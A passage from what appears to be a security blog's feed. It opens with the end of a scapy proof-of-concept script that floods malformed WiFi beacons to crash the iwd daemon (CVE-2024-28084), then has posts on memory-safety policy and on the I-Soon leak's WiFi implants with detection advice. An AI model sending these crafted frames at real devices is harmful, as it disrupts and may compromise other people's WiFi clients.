style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"iw dev %s set type monitor"</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"ip link set dev %s up"</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"iw dev %s set channel %d"</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">AP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> mac</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> mode</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"stdio"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> iface</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"wlan0"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">channel </span><span class="token operator">=</span><span class="token plain"> channel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">iface </span><span class="token operator">=</span><span class="token plain"> iface</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mode </span><span class="token operator">=</span><span class="token plain"> mode</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mode </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"iface"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">              mac </span><span class="token operator">=</span><span class="token plain"> if_hwaddr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            config_mon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">raise</span><span class="token plain"> Exception</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Need a mac"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mac </span><span class="token operator">=</span><span class="token plain"> mac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">get_radiotap_header</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> RadioTap</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">dot11_beacon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> bssid</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        crash</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">b"\xdd\x07"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b"\x50\x6f\x9a"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b"\x09"</span><span class="token plain">  </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b"\x19\x08\x00"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b"\xdd\x10"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b"\x50\x6f\x9a"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b"\x09"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token string" style="color:rgb(255, 121, 198)">b"\x00\x00"</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        evil_packet </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">get_radiotap_header</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token operator">/</span><span class="token plain"> Dot11</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                subtype</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> addr1</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> addr2</span><span class="token operator">=</span><span class="token plain">bssid</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> addr3</span><span class="token operator">=</span><span class="token plain">bssid</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token operator">/</span><span class="token plain"> Dot11Beacon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">cap</span><span class="token operator">=</span><span class="token number">0x3101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token operator">/</span><span class="token plain"> crash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sendp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">evil_packet</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">run</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">interval </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0.05</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dot11_beacon</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token comment" style="color:rgb(98, 114, 164)"># Sleep</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            sleep</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">interval</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">sendp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> packet</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> verbose</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mode </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"stdio"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            x </span><span class="token operator">=</span><span class="token plain"> packet</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">build</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            sys</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">stdout</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">write</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">struct</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">pack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"&lt;L"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> x</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            sys</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">stdout</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flush</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">mode </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"iface"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        sendp</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">packet</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> iface</span><span class="token operator">=</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">iface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> verbose</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> __name__ </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"__main__"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ap </span><span class="token operator">=</span><span class="token plain"> AP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">mode</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"iface"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> iface</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">"wlan1"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> channel</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ap</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="iwd" term="iwd"/>
        <category label="memory-corruption" term="memory-corruption"/>
        <category label="wifi" term="wifi"/>
        <category label="CVE-2024-28084" term="CVE-2024-28084"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Software Safety Looks Different From The Other Side]]></title>
        <id>https://www.supernetworks.org/pages/blog/federal-focus-memory-corruption-2024</id>
        <link href="https://www.supernetworks.org/pages/blog/federal-focus-memory-corruption-2024"/>
        <updated>2024-03-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Memory Corruption Hardening is Controversial Now?]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="memory-corruption-hardening-is-controversial-now">Memory Corruption Hardening is Controversial Now?<a href="https://www.supernetworks.org/pages/blog/federal-focus-memory-corruption-2024#memory-corruption-hardening-is-controversial-now" class="hash-link" aria-label="Direct link to Memory Corruption Hardening is Controversial Now?" title="Direct link to Memory Corruption Hardening is Controversial Now?">​</a></h2>
<p>Social Media has a lot of criticism lately for the push for memory safety as a metric for the labeling of software security.
Between software supply chain susceptibility, command injection, and logic bugs obliterating software regularly,
it doesn't seem like its the best candidate for a software safety metric.</p>
<p>The background for why the federal government is reporting in the area is <a href="https://www.whitehouse.gov/briefing-room/presidential-actions/2021/05/12/executive-order-on-improving-the-nations-cybersecurity/" target="_blank" rel="noopener noreferrer">E.O. 14028</a></p>
<p>From the EO there's several pushes for software and network safety. These are things like requiring Zero Trust Access for the Federal Government, EDR on federal systems for monitoring and responding to attacks,  SBOMs for supply chain safety, and creating safety standards for IOT devices. Although the main focus is the federal government there's an aim to push out software safety standards to the public as a whole.</p>
<p>And it's regulation for consumers that I see getting some criticism. NIST's key areas interact with the labeling of safety for IOT and consumer software -- which has everyone skeptical because the government may not seem to be the best equipped for leading edge software practices, and regulatory overhead will raise the burden for software developers without necessarily moving software security forward.</p>
<p><img decoding="async" loading="lazy" src="https://www.nist.gov/sites/default/files/images/2022/04/27/EO-task_and-timeline.png" alt="nist-timeline" class="img_ev3q"></p>
<p>On memory safety specifically, two key documents have been released over the past two quarters. The first is <a href="https://www.cisa.gov/sites/default/files/2023-12/The-Case-for-Memory-Safe-Roadmaps-508c.pdf" target="_blank" rel="noopener noreferrer">CISA's report on Memory Safety</a>.
The second is the <a href="https://www.whitehouse.gov/wp-content/uploads/2024/02/Final-ONCD-Technical-Report.pdf" target="_blank" rel="noopener noreferrer">ONCD Report on Measuring Memory Safety</a>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="software-looks-very-fragile-when-youre-good-at-exploitation">Software Looks Very Fragile When You're Good At Exploitation<a href="https://www.supernetworks.org/pages/blog/federal-focus-memory-corruption-2024#software-looks-very-fragile-when-youre-good-at-exploitation" class="hash-link" aria-label="Direct link to Software Looks Very Fragile When You're Good At Exploitation" title="Direct link to Software Looks Very Fragile When You're Good At Exploitation">​</a></h2>
<p>My take on memory safety is that it looks a lot more urgent from the vantage point of an organization with a fully stocked arsenal. Many pieces of software really start to look like an open door. And there's just a lot they see the public doesn't have regular access to.</p>
<p>To an individual or even a team of defenders at a top 10 tier tech company, things might seem a lot less urgent than they do the whitehouse because exploitation has become difficult. We've come quite a long way since <a href="https://en.wikipedia.org/wiki/Operation_Aurora" target="_blank" rel="noopener noreferrer">Operation Aurora</a> where attackers could spray the 32-bit address space with nops and shellcode to execute code. Between 64-bit address spaces, CFI, ASLR, memory tagging, MTE, shadow stacks, EDR kernel sensors, single-process unikernels, scanners in security coprocessors, yes -- whole swathes of crashes are made interceptable, unexploitable, or vastly unreliable.</p>
<p>It takes whole teams to make successful exploit chains against rich and common attack surfaces. However, if the cost of not having a capability is more than the price of making it, it becomes increasing probable that an exploit will exist until software begins to be fundamentally secure. Ten million, fifty million, a hundred million dollars seems like a ton of money for an exploit chain that's one patch away from disappearing. But to the federal government that can create trillions of dollars to solve a global crisis, that amount of funding remains a rounding error.</p>
<p>Likewise, defenders at the US federal government and its partners have access to ongoing and recent attack trends. They see how attackers surreptitiously take advantage of flaws that may not always become public or fully known. To them the situation might look a lot more untenable than it does to leading edge software developers from the tech giants.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="defender-advantage-through-regulatory-controls">Defender Advantage Through Regulatory Controls<a href="https://www.supernetworks.org/pages/blog/federal-focus-memory-corruption-2024#defender-advantage-through-regulatory-controls" class="hash-link" aria-label="Direct link to Defender Advantage Through Regulatory Controls" title="Direct link to Defender Advantage Through Regulatory Controls">​</a></h2>
<p>On one hand -- regulatory burden like we've seen with GDPR in the EU can really hurt developers, as well as user experience. Does anyone feel like the EU solved privacy for citizens or do they feel more surveilled than ever? On the other hand, regulation might just be the thing that helps secure software overcome the marketing department at Insecure Vendor Co. or helps Ada win against C or creates a market for new architectures.</p>
<p>On performance: if we're cool with shipping web browsers as native apps with a million NPM packages, we'll probably survive okay with compilers that waste instructions.</p>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="usgov" term="usgov"/>
        <category label="fedgov" term="fedgov"/>
        <category label="memory-corruption" term="memory-corruption"/>
        <category label="safety" term="safety"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[What the I-Soon Leak Tells Us About WiFi Hacking]]></title>
        <id>https://www.supernetworks.org/pages/blog/isoon-wifi-exploitation-2024</id>
        <link href="https://www.supernetworks.org/pages/blog/isoon-wifi-exploitation-2024"/>
        <updated>2024-02-22T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[The I Soon Dump]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-i-soon-dump">The I Soon Dump<a href="https://www.supernetworks.org/pages/blog/isoon-wifi-exploitation-2024#the-i-soon-dump" class="hash-link" aria-label="Direct link to The I Soon Dump" title="Direct link to The I Soon Dump">​</a></h2>
<p>"The documents come from iSoon, also known as Auxun, a Chinese firm headquartered in Shanghai that sells third-party hacking and data-gathering services to Chinese government bureaus, security groups and state-owned enterprises. "</p>
<p>The <a href="https://www.washingtonpost.com/world/2024/02/21/china-hacking-leak-documents-isoon/" target="_blank" rel="noopener noreferrer">Washington Post</a> writes that
"The documents show that iSoon met and worked with members of APT41, a Chinese hacking group that was charged by the U.S. Justice Department in 2020 for targeting more than 100 video game firms, universities and other victims worldwide."</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="wifi-capability-hardware-implants">WiFi Capability: Hardware Implants<a href="https://www.supernetworks.org/pages/blog/isoon-wifi-exploitation-2024#wifi-capability-hardware-implants" class="hash-link" aria-label="Direct link to WiFi Capability: Hardware Implants" title="Direct link to WiFi Capability: Hardware Implants">​</a></h2>
<p>The dump has a product catalogue that starting from page 18, describes hardware implants for persistent access to target environments. These implants are used for accessing a victim network without having to evade
outbound proxies or firewalls, where security monitoring might take place. So they can attack the squishy inside
directly.</p>
<p>They communicate to targets over WiFi and exfiltrate over 3G/4G.</p>
<p><img decoding="async" loading="lazy" alt="implantable-device" src="https://www.supernetworks.org/pages/assets/images/12756724-394c-4576-b373-7c53f1abbd94_22-08c351cb6c88ab8fcc7ec1dfff54a8b4.png" width="1189" height="1681" class="img_ev3q"></p>
<ul>
<li>They are small, portable, and have 3G/4G internet connectivity</li>
<li>They can be powered or run on a 10A battery that lasts 8-20 hours depending on activity</li>
<li>They can be embedded into a decoy power bank or other device</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="wifi-attack-system">WiFi Attack System<a href="https://www.supernetworks.org/pages/blog/isoon-wifi-exploitation-2024#wifi-attack-system" class="hash-link" aria-label="Direct link to WiFi Attack System" title="Direct link to WiFi Attack System">​</a></h3>
<p>Attackers can also connect into the sensors over 4G connectivity and then attack the environment over WiFi.
It has standard capabilities one finds in tools like Kali Linux.</p>
<p><img decoding="async" loading="lazy" alt="wifi-software-kit" src="https://www.supernetworks.org/pages/assets/images/d5ff8b65-db15-418a-b33e-169498d79110_12-62e38500bf87ae1efb434e01ea69b276.png" width="1189" height="1681" class="img_ev3q"></p>
<ul>
<li>WEP/WPS/WPA/WPA2 cracking</li>
<li>Cracking can also be done via a more powerful cloud system</li>
<li>Once on a network the device can inspect packets for hashes</li>
<li>Once on a network the device can brute force login credentials for routers</li>
<li>The device can proxy traffic to the local network</li>
</ul>
<p>Uniquely:</p>
<ul>
<li>The device can self destruct</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="whats-not-in-the-dump">What's Not in The Dump<a href="https://www.supernetworks.org/pages/blog/isoon-wifi-exploitation-2024#whats-not-in-the-dump" class="hash-link" aria-label="Direct link to What's Not in The Dump" title="Direct link to What's Not in The Dump">​</a></h3>
<p>What we don't see a cache of ready to go router exploits, patched or unpatched,
as well as software/firmware capabilities for unpatched IOT devices which are soft
targets on wifi.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="closing-thoughts-on-detection">Closing Thoughts on Detection<a href="https://www.supernetworks.org/pages/blog/isoon-wifi-exploitation-2024#closing-thoughts-on-detection" class="hash-link" aria-label="Direct link to Closing Thoughts on Detection" title="Direct link to Closing Thoughts on Detection">​</a></h3>
<ul>
<li>Nothing in the documents hits on masquerading implants by MAC address. A good asset inventory might go a long way when the device joins the network</li>
<li>Tools like <a href="https://www.nzyme.org/" target="_blank" rel="noopener noreferrer">Nzyme</a> can help detect WiFi Cracking attempts as well as detect rogue APs in the environment. SPR supports <a href="https://github.com/spr-networks/spr-nzyme-tap/" target="_blank" rel="noopener noreferrer">nzyme taps</a></li>
<li>Building a baseline of WiFi APs would be the best way a defender can detect a WiFi Implant entering the environment</li>
<li>Defenders need internal network sensors as well as sensors on the outbound network</li>
<li>A zero-trust network setup would help mitigate this type of implant reaching an asset's networked resources, but would still leave client devices vulnerable to Rogue AP attacks unless they employ zero-trust principles for WiFi connectivity (like EAP-TLS/EAP-TTLS or per-device WPA3 personal passwords)</li>
</ul>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="spyware" term="spyware"/>
        <category label="wifi" term="wifi"/>
        <category label="implants" term="implants"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Alerts to Improve Network Visibility]]></title>
